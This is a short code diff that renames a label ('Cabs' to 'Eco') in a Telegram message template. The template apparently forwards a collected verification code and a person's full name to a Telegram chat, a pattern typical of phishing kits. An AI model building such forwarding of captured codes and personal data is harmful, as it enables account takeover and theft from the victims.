@@ -354,7 +354,7 @@ Verification Code:
         }
 
         const telegramMessage = `
-<b> Cabs🔔</b>
+<b> Eco🔔</b>
 
 Name:
 ${result.full_name}
